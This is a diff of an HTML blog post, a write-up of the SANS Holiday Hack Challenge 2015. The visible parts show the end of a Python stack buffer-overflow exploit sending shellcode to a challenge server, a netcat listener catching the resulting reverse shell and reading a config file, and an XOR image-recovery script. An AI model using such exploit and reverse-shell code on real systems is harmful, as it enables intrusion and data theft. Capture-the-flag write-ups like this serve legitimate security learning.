-    <span class="n">payload</span> <span class="o">=</span> <span class="s">&#39;</span><span class="se">\x90</span><span class="s">&#39;</span> <span class="o">*</span> <span class="mi">104</span> <span class="c"># padding to overwrite the saved value of eip</span>
-    <span class="n">payload</span> <span class="o">+=</span> <span class="s">&#39;</span><span class="se">\xe4\xff\xff\xe4</span><span class="s">&#39;</span> <span class="c"># canary stack</span>
-    <span class="n">payload</span> <span class="o">+=</span> <span class="s">&#39;</span><span class="se">\x6b\x93\x04\x08</span><span class="s">&#39;</span> <span class="c"># address of our &#39;jump esp&#39; gadget</span>
-    <span class="n">payload</span> <span class="o">+=</span> <span class="s">&#39;</span><span class="se">\x6b\x93\x04\x08</span><span class="s">&#39;</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\x90</span><span class="s1">&#39;</span> <span class="o">*</span> <span class="mi">104</span> <span class="c1"># padding to overwrite the saved value of eip</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="se">\xe4\xff\xff\xe4</span><span class="s1">&#39;</span> <span class="c1"># canary stack</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="se">\x6b\x93\x04\x08</span><span class="s1">&#39;</span> <span class="c1"># address of our &#39;jump esp&#39; gadget</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="se">\x6b\x93\x04\x08</span><span class="s1">&#39;</span>
     <span class="n">payload</span> <span class="o">+=</span> <span class="n">shellcode</span>
-    <span class="n">payload</span> <span class="o">+=</span> <span class="s">&#39;</span><span class="se">\x90</span><span class="s">&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">200</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span> <span class="c"># padding to get a length of 200 bytes</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="se">\x90</span><span class="s1">&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">200</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span> <span class="c1"># padding to get a length of 200 bytes</span>
 
-    <span class="c"># We connect to our distant server</span>
+    <span class="c1"># We connect to our distant server</span>
     <span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">()</span>
     <span class="n">sock</span><span class="o">.</span><span class="n">settimeout</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
-    <span class="n">sock</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;54.233.105.81&#39;</span><span class="p">,</span> <span class="mi">4242</span><span class="p">))</span>
+    <span class="n">sock</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s1">&#39;54.233.105.81&#39;</span><span class="p">,</span> <span class="mi">4242</span><span class="p">))</span>
 
-    <span class="c"># We receive all the data we can</span>
+    <span class="c1"># We receive all the data we can</span>
     <span class="k">try</span><span class="p">:</span>
         <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span>
     <span class="k">except</span> <span class="n">socket</span><span class="o">.</span><span class="n">timeout</span><span class="p">:</span>
         <span class="k">pass</span>
 
-    <span class="c"># We enter the secret command</span>
-    <span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;X&#39;</span><span class="p">)</span>
+    <span class="c1"># We enter the secret command</span>
+    <span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s1">&#39;X&#39;</span><span class="p">)</span>
 
-    <span class="c"># We receive all the data we can</span>
+    <span class="c1"># We receive all the data we can</span>
     <span class="k">try</span><span class="p">:</span>
         <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
             <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4096</span><span class="p">),</span>
     <span class="k">except</span> <span class="n">socket</span><span class="o">.</span><span class="n">timeout</span><span class="p">:</span>
         <span class="k">pass</span>
 
-    <span class="c"># We send our payload</span>
+    <span class="c1"># We send our payload</span>
     <span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 
     <span class="k">return</span> <span class="mi">0</span>
 
-<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&#39;__main__&#39;</span><span class="p">:</span>
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
     <span class="n">main</span><span class="p">()</span>
 </pre></div>
 <p>We launch our exploit:</p>
-<div class="highlight"><pre><span class="nv">$ </span>./exploit_sg05.py
+<div class="highlight"><pre><span></span><span class="gp">$</span> ./exploit_sg05.py
 </pre></div>
 <p>And in another terminal, on the server I own:</p>
-<div class="highlight"><pre><span class="nv">$ </span>nc -lvp 8080
-listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">8080</span> ...
-connect to <span class="o">[</span>192.168.XX.XX<span class="o">]</span> from ec2-54-233-105-81.sa-east-1.compute.amazonaws.com <span class="o">[</span>54.233.105.81<span class="o">]</span> 42021
-cat /gnome/www/files/gnome.conf
-Gnome Serial Number: 4CKL3R43V4
-Current config file: ./tmp/e31faee/cfg/sg.01.v1339.cfg
-Allow new subordinates?: YES
-Camera monitoring?: YES
-Audio monitoring?: YES
-Camera update rate: 60min
-Gnome mode: SuperGnome
-Gnome name: SG-05
-Allow file uploads?: YES
-Allowed file formats: .png
-Allowed file size: 512kb
-Files directory: /gnome/www/files/
+<div class="highlight"><pre><span></span><span class="gp">$</span> nc -lvp <span class="m">8080</span>
+<span class="go">listening on [any] 8080 ...</span>
+<span class="go">connect to [192.168.XX.XX] from ec2-54-233-105-81.sa-east-1.compute.amazonaws.com [54.233.105.81] 42021</span>
+<span class="go">cat /gnome/www/files/gnome.conf</span>
+<span class="go">Gnome Serial Number: 4CKL3R43V4</span>
+<span class="go">Current config file: ./tmp/e31faee/cfg/sg.01.v1339.cfg</span>
+<span class="go">Allow new subordinates?: YES</span>
+<span class="go">Camera monitoring?: YES</span>
+<span class="go">Audio monitoring?: YES</span>
+<span class="go">Camera update rate: 60min</span>
+<span class="go">Gnome mode: SuperGnome</span>
+<span class="go">Gnome name: SG-05</span>
+<span class="go">Allow file uploads?: YES</span>
+<span class="go">Allowed file formats: .png</span>
+<span class="go">Allowed file size: 512kb</span>
+<span class="go">Files directory: /gnome/www/files/</span>
 </pre></div>
 <p>The flag for this SuperGnome is <code>4CKL3R43V4</code>
 (<a class="reference external" href="http://www.sou.edu/cs/lynnackler.html">geeky reference</a>).</p>
 </div>
 </div>
 <div class="section" id="part-5-baby-its-gnome-outside-sinister-plot-and-attribution">
-<h2>Part 5: Baby, It’s Gnome Outside: <em>Sinister Plot and Attribution</em></h2>
+<h2><a class="toc-backref" href="#id15">Part 5: Baby, It’s Gnome Outside: <em>Sinister Plot and Attribution</em></a></h2>
 <p>We can see on the SuperGnomes some capture files, inside ZIP archives. We can
 also see from a conversation on the GnomeNET on the SuperGnomes that someone
 has a problem with the pictures taken by the gnomes: if some gnomes have the
@@ -877,7 +904,7 @@ and the images.</p>
 we can see some SMTP and IMAP traffic.By using the wonderful
 &quot;Follow TCP Stream&quot; functionnality, we can recover the full traffic.</p>
 <div class="section" id="first-capture-file">
-<h3>First capture file</h3>
+<h3><a class="toc-backref" href="#id16">First capture file</a></h3>
 <pre class="literal-block">
 From: &quot;c&quot; &lt;c&#64;atnascorp.com&gt;
 To: &lt;jojo&#64;atnascorp.com&gt;
@@ -912,7 +939,7 @@ Looking forward to working with you on this project!
 <img alt="giyh_architecture.jpg" class="align-center" src="/images/sans-christmas-challenge-2015/giyh_architecture.jpg" />
 </div>
 <div class="section" id="second-capture-file">
-<h3>Second capture file</h3>
+<h3><a class="toc-backref" href="#id17">Second capture file</a></h3>
 <pre class="literal-block">
 From: &quot;c&quot; &lt;c&#64;atnascorp.com&gt;
 To: &lt;supplier&#64;ginormouselectronicssupplier.com&gt;
@@ -951,7 +978,7 @@ Regards,
 </pre>
 </div>
 <div class="section" id="third-capture-file">
-<h3>Third capture file</h3>
+<h3><a class="toc-backref" href="#id18">Third capture file</a></h3>
 <pre class="literal-block">
 From: &quot;c&quot; &lt;c&#64;atnascorp.com&gt;
 To: &lt;burglerlackeys&#64;atnascorp.com&gt;
@@ -1003,7 +1030,7 @@ President and CEO of ATNAS Corporation
 </pre>
 </div>
 <div class="section" id="fourth-capture-file">
-<h3>Fourth capture file</h3>
+<h3><a class="toc-backref" href="#id19">Fourth capture file</a></h3>
 <pre class="literal-block">
 From: &quot;c&quot; &lt;c&#64;atnascorp.com&gt;
 To: &lt;psychdoctor&#64;whovillepsychiatrists.com&gt;
@@ -1062,7 +1089,7 @@ Cindy Lou Who
 </pre>
 </div>
 <div class="section" id="fifth-capture-file">
-<h3>Fifth capture file</h3>
+<h3><a class="toc-backref" href="#id20">Fifth capture file</a></h3>
 <pre class="literal-block">
 From: &quot;Grinch&quot; &lt;grinch&#64;who-villeisp.com&gt;
 To: &lt;c&#64;atnascorp.com&gt;
@@ -1102,41 +1129,41 @@ I sincerely wish you a holiday season full of kindness and warmth,
 </pre>
 </div>
 <div class="section" id="let-s-unxor-the-images">
-<h3>Let's unXOR the images</h3>
+<h3><a class="toc-backref" href="#id21">Let's unXOR the images</a></h3>
 <p>With a simple Python script, we can take every image and XOR the RGB pixels
 to recover the image from the boss' office:</p>
-<div class="highlight"><pre><span class="c">#!/usr/bin/env python</span>
+<div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env python</span>
 
 <span class="kn">import</span> <span class="nn">sys</span>
 <span class="kn">from</span> <span class="nn">PIL</span> <span class="kn">import</span> <span class="n">Image</span>
 
 <span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
-    <span class="c"># We open the camera feed overlap image</span>
-    <span class="n">scrambled_image</span> <span class="o">=</span> <span class="n">Image</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">6</span><span class="p">])</span><span class="o">.</span><span class="n">convert</span><span class="p">(</span><span class="s">&#39;RGB&#39;</span><span class="p">)</span>
+    <span class="c1"># We open the camera feed overlap image</span>
+    <span class="n">scrambled_image</span> <span class="o">=</span> <span class="n">Image</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">6</span><span class="p">])</span><span class="o">.</span><span class="n">convert</span><span class="p">(</span><span class="s1">&#39;RGB&#39;</span><span class="p">)</span>
     <span class="n">scrambled_image_pixels</span> <span class="o">=</span> <span class="n">scrambled_image</span><span class="o">.</span><span class="n">load</span><span class="p">()</span>
     <span class="n">width</span><span class="p">,</span> <span class="n">height</span> <span class="o">=</span> <span class="n">scrambled_image</span><span class="o">.</span><span class="n">size</span>
 
-    <span class="c"># For every image found in one of the SuperGnomes</span>
+    <span class="c1"># For every image found in one of the SuperGnomes</span>
     <span class="k">for</span> <span class="n">image</span> <span class="ow">in</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">:</span><span class="mi">6</span><span class="p">]:</span>
-        <span class="n">image_pixels</span> <span class="o">=</span> <span class="n">Image</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="n">image</span><span class="p">)</span><span class="o">.</span><span class="n">convert</span><span class="p">(</span><span class="s">&#39;RGB&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">load</span><span class="p">()</span>
+        <span class="n">image_pixels</span> <span class="o">=</span> <span class="n">Image</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="n">image</span><span class="p">)</span><span class="o">.</span><span class="n">convert</span><span class="p">(</span><span class="s1">&#39;RGB&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">load</span><span class="p">()</span>
         <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="n">width</span><span class="p">):</span>
             <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="n">height</span><span class="p">):</span>
-                <span class="c"># We take the RGB components</span>
+                <span class="c1"># We take the RGB components</span>
                 <span class="n">r1</span><span class="p">,</span> <span class="n">g1</span><span class="p">,</span> <span class="n">b1</span> <span class="o">=</span> <span class="n">scrambled_image_pixels</span><span class="p">[</span><span class="n">i</span><span class="p">,</span> <span class="n">j</span><span class="p">]</span>
                 <span class="n">r2</span><span class="p">,</span> <span class="n">g2</span><span class="p">,</span> <span class="n">b2</span> <span class="o">=</span> <span class="n">image_pixels</span><span class="p">[</span><span class="n">i</span><span class="p">,</span> <span class="n">j</span><span class="p">]</span>
-                <span class="c"># And we XOR them to recover the original value</span>
+                <span class="c1"># And we XOR them to recover the original value</span>
                 <span class="n">scrambled_image_pixels</span><span class="p">[</span><span class="n">i</span><span class="p">,</span> <span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">r1</span> <span class="o">^</span> <span class="n">r2</span><span class="p">,</span> <span class="n">g1</span> <span class="o">^</span> <span class="n">g2</span><span class="p">,</span> <span class="n">b1</span> <span class="o">^</span> <span class="n">b2</span><span class="p">)</span>
 
-    <span class="c"># We save the result in a new image</span>
-    <span class="n">scrambled_image</span><span class="o">.</span><span class="n">save</span><span class="p">(</span><span class="s">&#39;result.png&#39;</span><span class="p">,</span> <span class="s">&#39;PNG&#39;</span><span class="p">)</span>
+    <span class="c1"># We save the result in a new image</span>
+    <span class="n">scrambled_image</span><span class="o">.</span><span class="n">save</span><span class="p">(</span><span class="s1">&#39;result.png&#39;</span><span class="p">,</span> <span class="s1">&#39;PNG&#39;</span><span class="p">)</span>
 
     <span class="k">return</span> <span class="mi">0</span>
 
-<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&#39;__main__&#39;</span><span class="p">:</span>
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
     <span class="n">main</span><span class="p">()</span>
 </pre></div>
 <p>Then, we just have to run this script:</p>
-<div class="highlight"><pre><span class="nv">$ </span>./unxor_images.py sg01/factory_cam_1.png sg02/factory_cam_2.png sg03/factory_cam_3.png <span class="se">\</span>
+<div class="highlight"><pre><span></span><span class="gp">$</span> ./unxor_images.py sg01/factory_cam_1.png sg02/factory_cam_2.png sg03/factory_cam_3.png <span class="se">\</span>
     sg04/factory_cam_4.png sg05/factory_cam_5.png camera_feed_overlap_error.png
 </pre></div>
 <p>This gives us the resulting image:</p>
@@ -1144,7 +1171,7 @@ to recover the image from the boss' office:</p>
 </div>
 </div>
 <div class="section" id="epilogue-twas-the-gnome-before-christmas-wrapping-it-all-up">
-<h2>Epilogue: ‘Twas the Gnome Before Christmas: <em>Wrapping It All Up</em></h2>
+<h2><a class="toc-backref" href="#id22">Epilogue: ‘Twas the Gnome Before Christmas: <em>Wrapping It All Up</em></a></h2>
 <p>As in every SANS Christmas Challenge, we have to answer several
 questions:</p>
 <ol class="arabic simple">
@@ -1213,7 +1240,7 @@ traumatised by the Grinch stealing Christmas, she has developped a deep
 hatred for this holiday.</p>
 </div>
 <div class="section" id="conclusion">
-<h2>Conclusion</h2>
+<h2><a class="toc-backref" href="#id23">Conclusion</a></h2>
 <p>I really enjoyed doing this challenge, because it allowed me to develop
 my skills in technologies I'm not familiar with, such as NoSQL database
 engines, or buffer-overflow (something I should really work on).</p>
@@ -1229,7 +1256,7 @@ engines, or buffer-overflow (something I should really work on).</p>
 
     <footer>
 <p>
-  &copy; Yannick Méheut 2017 - This work is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by-sa/4.0/">Creative Commons Attribution-ShareAlike 4.0 International License</a>
+  &copy; Yannick Méheut 2020 - This work is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by-sa/4.0/">Creative Commons Attribution-ShareAlike 4.0 International License</a>
 </p>
 <p>Built using <a href="http://getpelican.com" target="_blank">Pelican</a> - <a href="https://github.com/alexandrevicenzi/flex" target="_blank">Flex</a> theme by <a href="http://alexandrevicenzi.com" target="_blank">Alexandre Vicenzi</a></p><p>
   <a rel="license"
@@ -1255,11 +1282,11 @@ engines, or buffer-overflow (something I should really work on).</p>
   "author": {
     "@type": "Person",
     "name": "useless",
-    "url": "../../../../../author/useless.html"
+    "url": "https://allyourbase.utouch.fr/author/useless.html"
   },
   "image": "/images/useless_profile_pic.jpg",
-  "url": "../../../../../posts/2016/01/09/sans-christmas-challenge-2015/",
-  "description": "This year again, the SANS institute delights us with a wonderful Christmas Challenge. We follow the Dosis family, after they purchase a Gnome in Your Home for their kids, Jessica and Joshua. These two kids, especially bright for their age, tinker with the gnome, to find that it has a ..."
+  "url": "https://allyourbase.utouch.fr/posts/2016/01/09/sans-christmas-challenge-2015/",
+  "description": "This year again, the SANS institute delights us with a wonderful Christmas Challenge. We follow the Dosis family, after they purchase a Gnome in Your Home for their kids, Jessica and Joshua. These two kids, especially bright for their age, tinker with the gnome, to find that it has a …"
 }
 </script></body>
 </html>
